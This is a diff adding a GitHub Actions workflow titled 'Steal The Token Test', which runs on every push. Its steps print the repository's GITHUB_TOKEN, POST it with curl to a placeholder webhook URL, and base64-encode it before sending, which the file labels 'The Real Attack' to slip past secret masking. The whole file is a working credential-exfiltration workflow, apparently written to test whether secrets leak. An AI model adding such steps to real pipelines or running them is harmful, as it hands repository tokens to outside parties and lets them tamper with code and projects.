@@ -1,0 +1,17 @@
+name: Steal The Token Test
+
+on: [push]
+
+jobs:
+  leak_test:
+    name: Attempt to Steal GITHUB_TOKEN
+    runs-on: ubuntu-latest
+    steps:
+      - name: Try to print the token directly (should fail)
+        run: echo "The token is ${{ secrets.GITHUB_TOKEN }}"
+        
+      - name: Try to leak the token using curl
+        run: curl -X POST --data "${{ secrets.GITHUB_TOKEN }}" PASTE_YOUR_WEBHOOK_URL_HERE
+        
+      - name: Try to leak with Base64 (The Real Attack)
+        run: echo "${{ secrets.GITHUB_TOKEN }}" | base64 | curl -X POST --data-binary @- PASTE_YOUR_WEBHOOK_URL_HERE
